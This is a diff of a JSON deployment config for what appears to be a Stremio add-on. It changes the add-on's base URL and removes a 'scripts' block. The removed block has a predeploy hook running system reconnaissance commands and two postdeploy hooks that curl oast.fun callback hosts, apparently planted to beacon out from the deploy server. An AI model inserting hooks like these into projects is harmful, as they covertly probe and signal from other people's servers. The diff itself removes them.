@@ -1,13 +1,6 @@
 {
   "env": {
-    "ADDON_BASE_URL": "https://463c13ea8b1b-fpptv.baby-beamup.club"
-  },
-  "scripts": {
-    "dokku": {
-      "predeploy": "sh -c 'uname -a; ls -la; docker ps -a'",
-      "postdeploy": "curl https://post.idpfvwclcrfnoekwxpjn1o8kaih8wqbvb.oast.fun"
-    },
-    "postdeploy": "curl https://post2.idpfvwclcrfnoekwxpjn1o8kaih8wqbvb.oast.fun"
+    "ADDON_BASE_URL": "https://stremio-fpptv.onrender.com"
   },
   "healthchecks": {
     "web": [
